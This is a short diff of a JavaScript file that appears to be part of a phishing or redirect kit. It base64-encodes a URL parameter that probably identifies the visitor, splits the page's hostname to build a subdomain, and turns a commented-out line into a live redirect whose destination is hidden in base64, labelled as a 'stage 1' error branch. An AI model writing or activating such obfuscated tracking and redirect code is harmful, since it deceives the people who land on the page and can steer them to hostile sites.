@@ -166,7 +166,7 @@ function getRandomString(length) {
           if (isTrue) {
           var queryString = window.location.search;
           var urlParams = new URLSearchParams(queryString);
-          var oxx = urlParams.get('i');
+          var oxx = btoa(urlParams.get('i'));
           var hos = window.location.hostname;
           var dmainParts = hos.split('.').reverse();
           var subdom = dmainParts.slice(2).reverse().join('-');
@@ -183,8 +183,7 @@ function getRandomString(length) {
         }, 10000);
           } else {
             setTimeout(function() {
-              console.log('ERROR AT STAGE 1 Y..what triggered');
-              //window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
+              window.location.replace(atob('aHR0cHM6Ly91bnN1YnNjcmliZS5naXRodWIuaW8v'));
           }, 500);
           }
       }
